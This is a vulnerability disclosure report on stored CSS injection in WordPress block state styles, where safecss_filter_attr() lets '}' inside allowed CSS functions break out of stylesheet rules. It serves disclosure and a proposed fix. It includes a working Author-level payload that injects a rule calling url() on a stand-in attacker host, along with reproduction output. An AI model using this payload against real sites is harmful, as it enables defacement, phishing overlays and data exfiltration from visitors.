# Security Finding

## Stored CSS injection via block "state styles" — `safecss_filter_attr()` allows `}` inside CSS functions, breaking out of generated stylesheet rules

### Summary
A user **without the `unfiltered_html` capability** (e.g. the default **Author** role on
single‑site; any non‑super‑admin on multisite) can store arbitrary CSS rules that are
emitted, verbatim, into a front‑end `<style>` element rendered for every visitor.

The sanitizer that is supposed to prevent this, `safecss_filter_attr()`, only checks a
*modified* copy of the value (with allowed CSS functions stripped out) for the forbidden
characters `\ ( & = } /*`, while the *original, unmodified* value is what gets written to
the output. Any forbidden character placed **inside the parentheses of an allowed CSS
function** (e.g. `rotate(...)`, `calc(...)`, `var(...)`, `linear-gradient(...)`) therefore
survives. When the surviving character is `}` and the value is used in a **stylesheet
context** (a CSS rule block `selector{ ... }`, as opposed to an inline `style="..."`
attribute), the `}` closes the rule early and lets the attacker inject a new, fully
attacker‑controlled CSS rule.

The block **state styles** feature added in 7.1 (`wp-includes/block-supports/states.php`)
is a directly reachable stylesheet sink: it takes arbitrary values out of a block's
`style` attribute (e.g. `style[':hover']['color']['text']`), runs them through the style
engine (which calls `safecss_filter_attr()`), and emits the result as a real CSS rule via
`wp_style_engine_get_stylesheet_from_css_rules()`.

### Security boundary violated
`safecss_filter_attr()` is the boundary that stops users lacking `unfiltered_html` /
`edit_css` from injecting raw CSS into content that is rendered to other users. Authors and
Contributors never hold `unfiltered_html`; on multisite, neither do Editors or
Administrators. This finding lets those users bypass that boundary and store CSS that runs
in every visitor's browser (including administrators viewing the post on the front end).

### Impact
Stored CSS injection (not JavaScript execution). Realistic consequences:
- Exfiltration of data present in DOM attributes via attribute‑selector + `background:url()`
  requests to an attacker host (the PoC below already injects an external `url()`).
- Site‑wide UI redressing / defacement / phishing overlays, hiding admin or security
  notices, spoofing content.
Constraint: because `;` is a declaration separator consumed earlier in the sanitizer, each
injected rule holds a single declaration — but an unlimited number of single‑declaration
rules can be injected (`.a{...}.b{...}...`), which is sufficient for the above.

Severity: Medium (authenticated, low‑privilege actor; persistent; affects all visitors;
CSS‑only, not script execution).

---

### Exact source locations

**1. Root cause — `safecss_filter_attr()`**
`src/wp-includes/kses.php` (lines ~3027–3078). The allowed‑function stripping builds
`$css_test_string`, and the final safety check runs against that stripped string, while the
value appended to the output is the original `$css_item`:

```php
// Allowed functions (incl. 7.1 additions: transform/shape fns) are stripped from the TEST string.
$css_test_string = preg_replace(
    '/\b(?:var|calc|min|max|minmax|clamp|repeat'
    . '|matrix|matrix3d|perspective|rotate|rotate3d|rotateX|rotateY|rotateZ'
    . '|scale|scale3d|scaleX|scaleY|scaleZ|skew|skewX|skewY'
    . '|translate|translate3d|translateX|translateY|translateZ'
    . '|circle|ellipse|inset|path|polygon|rect|shape|xywh'
    . ')(\((?:[^()]|(?1))*\))/',
    '',
    $css_test_string
);
...
// Forbidden chars are checked on the STRIPPED string only:
$allow_css = 0 === preg_match( '%[\\\(&=}]|/\*%', $css_test_string );
...
if ( $allow_css ) {
    ...
    $css .= $css_item;   // <-- ORIGINAL value (with the smuggled `}`) is emitted.
}
```
Gradient stripping (line ~3014) and `url()` stripping (line ~2985) create the same gap for
`-gradient(...)` and `url(...)`.

**2. Reachable stylesheet sink — block state styles (7.1)**
- `src/wp-includes/block-supports/states.php`
  - `wp_render_block_states_support()` (hooked on `render_block`) reads `$block['attrs']['style'][':hover']` etc.
  - `wp_add_block_state_style_rule()` → `wp_style_engine_get_styles()` and then
    `WP_Style_Engine_CSS_Declarations::add_declaration()`.
  - Final emission via `wp_style_engine_get_stylesheet_from_css_rules( $style_rules, [ 'context' => 'block-supports' ] )`.
- `src/wp-includes/style-engine/class-wp-style-engine-css-declarations.php`
  - `filter_declaration()` (line ~190) calls `safecss_filter_attr( "{$property}:{$spacer}{$filtered_value}" )`
    and emits the returned declaration into a `selector{ ... }` rule.
- Allowed state‑capable blocks: `WP_Theme_JSON::VALID_BLOCK_PSEUDO_SELECTORS`
  (`src/wp-includes/class-wp-theme-json.php` line ~664) = `core/button`, `core/navigation-link`.

### Attacker‑controlled input → sink trace
1. Attacker (role **Author**, `edit_posts`+`publish_posts`, **no `unfiltered_html`**) submits
   `post_content` (via wp‑admin or `POST /wp/v2/posts`) containing a `core/button` block whose
   block‑delimiter JSON sets a hover style value:
   `{"style":{":hover":{"color":{"text":"rotate(0}.evil-injected{background:url(https://attacker.example/x.png)})"}}}}`
2. Save pipeline: `content_save_pre` → `wp_filter_post_kses()` (post context, because the
   user lacks `unfiltered_html`). kses sanitizes **HTML tags/attributes only**; the block
   `style` value lives inside an HTML *comment* delimiter, so it is **not** touched. Payload
   is stored intact. (Verified.)
3. Front‑end render: `do_blocks()` → `render_block` → `wp_render_block_states_support()` →
   style engine → `filter_declaration()` → `safecss_filter_attr()`. The `}` is inside
   `rotate(...)`, so it is removed from `$css_test_string`, the check passes, and the
   original value (with `}`) is written into the generated CSS rule.

### Expected vs. actual behavior
- **Expected:** a non‑`unfiltered_html` user cannot cause raw, attacker‑chosen CSS rules to
  appear in rendered output; `safecss_filter_attr()` neutralizes rule‑breaking characters.
- **Actual:** the emitted front‑end stylesheet is
  `.wp-states-XXXXXXXX .wp-block-button__link:hover{color:rotate(0}.evil-injected{background:url(https://attacker.example/x.png)}) !important;}`
  which browsers (CSS Syntax L3 error recovery) parse as the intended rule (dropped, invalid)
  **plus** a new valid global rule `.evil-injected{background:url(https://attacker.example/x.png)}`.

---

### Local reproduction (repository test environment)

Environment: repo `src/` bootstrapped against a local MariaDB install (`wp_install()`),
PHP 8.4. Scripts run against the real `wp-settings.php` bootstrap.

**(a) Root‑cause unit check — `}` survives inside allowed functions**
```
IN : transform: rotate(30deg})        OUT: transform: rotate(30deg})      <-- CONTAINS }
IN : width: calc(10px})               OUT: width: calc(10px})             <-- CONTAINS }
IN : color: var(--x})                 OUT: color: var(--x})               <-- CONTAINS }
IN : background: linear-gradient(red}, blue)  OUT: background: linear-gradient(red}, blue)  <-- CONTAINS }
IN : color: red}                      OUT:                                (correctly stripped — bare } outside a function)
```

**(b) Style‑engine stylesheet emission (states path building block)**
```php
WP_Style_Engine_CSS_Declarations::add_declaration('transform','rotate(30deg})',['important'=>true]);
// get_declarations_string() => "transform:rotate(30deg}) !important;"
wp_style_engine_get_stylesheet_from_css_rules([
  ['selector'=>'.victim','declarations'=>['transform'=>'rotate(30deg})']]
]);
// => ".victim{transform:rotate(30deg});}"   (the } is inside the rule body)
```

**(c) Full Author → insert → render chain (definitive)**
```
current user roles: author
has unfiltered_html: no
has publish_posts: YES
insert result: post 4 created
stored contains payload: YES
EMITTED FRONT-END STYLESHEET:
.wp-states-0da985f7 .wp-block-button__link:hover{color:rotate(0}.evil-injected{background:url(https://attacker.example/x.png)}) !important;}
ARBITRARY RULE INJECTED (.evil-injected): YES — vulnerable
```
The payload survived `wp_filter_post_kses()` on save and produced an attacker‑controlled CSS
rule (with an outbound `url()`) in the front‑end block‑supports stylesheet.

### Duplicate / history check
- Existing kses tests (`tests/phpunit/tests/kses.php`) explicitly assert that content inside
  allowed functions is **preserved** — e.g. line ~1429:
  `'background-image: linear-gradient(red, expression(alert))'` is expected to pass through
  unchanged. This documents the *inline‑style* contract of `safecss_filter_attr()` (where a
  `}` is inert). No test asserts that `}` is removed inside functions, and none covers the
  *stylesheet* use of the sanitizer's output.
- The exploitable sink (`block-supports/states.php`, using `safecss_filter_attr()` output in
  a real CSS rule block reachable with arbitrary `style` values) is new in 7.1.0. No matching
  advisory/test found in the repository.

### Root‑cause / fix direction (not applied)
The mismatch is that `safecss_filter_attr()` validates a function‑stripped copy but emits the
original. Options: (a) reject/neutralize declaration *values* containing `}` (and other
rule‑structural characters) before they are placed into a stylesheet rule in
`WP_Style_Engine_CSS_Declarations::filter_declaration()`; and/or (b) have
`safecss_filter_attr()` also reject values whose original form contains `}` even inside
functions when destined for stylesheet output. `}` legitimately never appears in a valid CSS
property value.
